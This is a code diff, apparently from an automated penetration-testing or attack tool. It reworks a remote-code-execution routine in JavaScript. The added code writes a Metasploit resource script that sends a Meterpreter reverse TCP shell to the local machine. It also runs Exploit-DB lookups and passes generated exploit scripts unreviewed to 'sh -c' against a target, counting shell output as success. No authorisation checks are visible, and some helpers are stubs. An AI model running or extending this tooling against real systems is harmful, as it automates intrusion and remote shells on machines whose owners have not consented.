@@ -302,62 +302,82 @@ async function runVulnerabilityScans(target, toolNames = [], options = {}) {
 
 async function attemptRCE(target, vulnerability) {
   try {
-    logger.tool('RCE Attempt', `Trying ${vulnerability.type}`, `on ${target}`);
+    logger.tool('RCE Attempt', `Trying ${vulnerability.type || vulnerability.service}`, `on ${target}`);
+    
+    const ipAddress = getIPAddress(target);
+    const hostname = getHostname(target);
+    const targetHost = ipAddress || hostname;
 
-    // Check for existing exploits
+    // PRIORITY 1: If we have a Metasploit module, use it directly
+    if (vulnerability.metasploit_module) {
+      logger.info(`Using Metasploit module: ${vulnerability.metasploit_module}`);
+      
+      const metasploitResult = await executeMetasploitExploit(
+        vulnerability.metasploit_module,
+        targetHost,
+        vulnerability.port || 80,
+        vulnerability
+      );
+      
+      if (metasploitResult.success) {
+        return metasploitResult;
+      }
+    }
+    
+    // PRIORITY 2: Known exploit name
+    if (vulnerability.exploit && !vulnerability.metasploit_module) {
+      logger.info(`Attempting known exploit: ${vulnerability.exploit}`);
+      
+      const exploitResult = await executeKnownExploit(vulnerability.exploit, target, vulnerability);
+      
+      if (exploitResult.success) {
+        return exploitResult;
+      }
+    }
+
+    // PRIORITY 3: Check for existing exploits in knowledge base
     const exploits = await require('./exploit/exploit-research.service').researchRCEExploits(target, vulnerability);
     
     if (exploits.exploits && exploits.exploits.length > 0) {
-      // Try existing exploits first
-      for (const exploit of exploits.exploits.slice(0, 3)) {
-        // Download and execute exploit if possible
-        logger.tool('Exploit', `Trying ${exploit.title || exploit.url}`);
+      logger.info(`Found ${exploits.exploits.length} known exploit(s)`);
+      
+      // Try existing exploits first (limit to 3 most promising)
+      for (let i = 0; i < Math.min(3, exploits.exploits.length); i++) {
+        const exploit = exploits.exploits[i];
+        logger.tool('Exploit', `Trying ${exploit.title || exploit.url}`, `(${i + 1}/3)`);
+        
+        // Try to download and execute exploit
+        const result = await executeDownloadedExploit(exploit, target, vulnerability);
+        if (result.success) {
+          return result;
+        }
       }
     }
 
-    // Generate new exploit
+    // PRIORITY 4: Generate new exploit as last resort
+    logger.step('No known exploits found - generating custom exploit...');
     const generatedExploit = await exploitGenerator.generateExploit(vulnerability, target, {
-      language: 'python',
+      goal: 'rce',
     });
 
-    if (generatedExploit && generatedExploit.code) {
-      // Execute generated exploit
-      const exploitResult = await executeExploit(generatedExploit, target);
+    if (generatedExploit) {
+      // Store and execute exploit
+      await require('./exploit/exploit-storage.service').storeExploit(generatedExploit, vulnerability);
       
-      if (exploitResult.success) {
-        return {
-          success: true,
-          method: 'generated_exploit',
-          exploit: generatedExploit,
-          result: exploitResult,
-        };
-      }
-    }
-
-    // Try Metasploit if available
-    const msfStatus = await toolRegistry.ensureToolAvailable('msfconsole');
-    if (msfStatus.available) {
-      const msfResult = await toolExecutor.executeMetasploit(
-        'exploit/multi/handler',
-        'python/meterpreter/reverse_tcp',
-        {
-          target,
-          lhost: 'localhost', // Should be configurable
-        }
-      );
-
-      if (msfResult.success || msfResult.stdout?.includes('session opened')) {
-        return {
-          success: true,
-          method: 'metasploit',
-          result: msfResult,
-        };
-      }
+      // Try to execute the generated exploit
+      const executeResult = await executeGeneratedExploit(generatedExploit, target);
+      
+      return {
+        success: executeResult.success,
+        exploit: generatedExploit,
+        message: executeResult.success ? 'RCE achieved!' : 'Exploit generated but execution failed',
+        output: executeResult.output,
+      };
     }
 
     return {
       success: false,
-      message: 'RCE attempt failed',
+      message: 'RCE attempt failed - no viable exploit found',
     };
   } catch (error) {
     logger.error('Error attempting RCE:', error);
@@ -366,6 +386,186 @@ async function attemptRCE(target, vulnerability) {
       error: error.message,
     };
   }
+}
+
+/**
+ * Execute Metasploit exploit
+ */
+async function executeMetasploitExploit(module, target, port, vulnerability) {
+  try {
+    logger.step(`Executing Metasploit: ${module}`);
+    
+    const fs = require('fs-extra');
+    const path = require('path');
+    
+    // Check if msfconsole is available
+    const msfStatus = await toolRegistry.ensureToolAvailable('msfconsole');
+    if (!msfStatus.available) {
+      logger.warn('Metasploit not available - cannot execute exploit');
+      return { success: false, error: 'Metasploit not installed' };
+    }
+    
+    // Get local IP for reverse shells
+    const localIP = getLocalIP();
+    
+    // Create Metasploit resource script
+    const msfScript = `use ${module}
+set RHOSTS ${target}
+${port ? `set RPORT ${port}` : ''}
+set LHOST ${localIP || '127.0.0.1'}
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+exploit -j
+`;
+    
+    const scriptPath = path.join(process.env.WORK_DIR || './work', `msf_${Date.now()}.rc`);
+    await fs.ensureDir(path.dirname(scriptPath));
+    await fs.writeFile(scriptPath, msfScript);
+    
+    logger.tool('msfconsole', `Running ${module}`, `against ${target}:${port}`);
+    logger.info(`Metasploit script created: ${scriptPath}`);
+    
+    const result = await toolExecutor.executeTool('msfconsole', ['-r', scriptPath], {
+      timeout: 300000, // 5 minutes
+    });
+    
+    // Check if exploit was successful
+    const output = result.output || result.stdout || '';
+    const success = output.includes('Meterpreter session') || 
+                    output.includes('Command shell session') ||
+                    output.includes('Session opened') ||
+                    output.includes('session 1 opened');
+    
+    if (success) {
+      logger.success('🎯 Metasploit exploit successful - session opened!');
+      return {
+        success: true,
+        output: output,
+        exploit: module,
+        method: 'metasploit',
+        session: 'active',
+      };
+    }
+    
+    return {
+      success: false,
+      output: output,
+      error: 'Exploit executed but no session opened',
+    };
+  } catch (error) {
+    logger.error('Error executing Metasploit exploit:', error);
+    return {
+      success: false,
+      error: error.message,
+    };
+  }
+}
+
+/**
+ * Execute known exploit (searchsploit or direct)
+ */
+async function executeKnownExploit(exploitName, target, vulnerability) {
+  try {
+    logger.step(`Executing known exploit: ${exploitName}`);
+    
+    // Try searchsploit first to find the exploit
+    const searchResult = await toolExecutor.executeTool('searchsploit', ['-x', exploitName], {
+      timeout: 60000,
+    });
+    
+    if (searchResult.success && searchResult.output) {
+      logger.info('Found exploit in Exploit-DB');
+      // Extract exploit path and execute
+      // This is a simplified version - full implementation would parse and execute
+    }
+    
+    return {
+      success: false,
+      error: 'Exploit execution not fully implemented',
+    };
+  } catch (error) {
+    return {
+      success: false,
+      error: error.message,
+    };
+  }
+}
+
+/**
+ * Execute downloaded exploit
+ */
+async function executeDownloadedExploit(exploit, target, vulnerability) {
+  // Placeholder for exploit download and execution
+  // Would download from URL, adapt for target, and execute
+  return {
+    success: false,
+    error: 'Exploit download/execution not yet implemented',
+  };
+}
+
+/**
+ * Execute generated exploit script
+ */
+async function executeGeneratedExploit(exploit, target) {
+  try {
+    if (!exploit.filepath) {
+      return { success: false, error: 'No exploit file to execute' };
+    }
+    
+    const { spawn } = require('child_process');
+    
+    // Determine how to execute based on language
+    let command = '';
+    if (exploit.language === 'python' || exploit.language === 'py') {
+      command = `python3 ${exploit.filepath} ${target}`;
+    } else if (exploit.language === 'bash' || exploit.language === 'sh') {
+      command = `bash ${exploit.filepath} ${target}`;
+    } else {
+      command = exploit.filepath;
+    }
+    
+    logger.tool('Execute', `Running ${exploit.language} exploit`, exploit.filepath);
+    
+    const result = await toolExecutor.executeTool('sh', ['-c', command], {
+      timeout: 60000,
+    });
+    
+    // Check for success indicators
+    const output = result.output || result.stdout || '';
+    const success = output.includes('shell') ||
+                    output.includes('root@') ||
+                    output.includes('$ ') ||
+                    output.includes('# ') ||
+                    result.success;
+    
+    return {
+      success: success,
+      output: output,
+    };
+  } catch (error) {
+    return {
+      success: false,
+      error: error.message,
+    };
+  }
+}
+
+/**
+ * Get local IP for reverse shells
+ */
+function getLocalIP() {
+  // Try to get local network IP
+  const os = require('os');
+  const interfaces = os.networkInterfaces();
+  
+  for (const name of Object.keys(interfaces)) {
+    for (const iface of interfaces[name]) {
+      if (iface.family === 'IPv4' && !iface.internal) {
+        return iface.address;
+      }
+    }
+  }
+  
+  return null;
 }
 
 async function executeExploit(exploit, target) {
@@ -492,6 +692,6 @@ module.exports = {
   runVulnerabilityScans,
   attemptRCE,
   runFullScan,
-  executeExploit,
+  executeMetasploitExploit,
 };
 
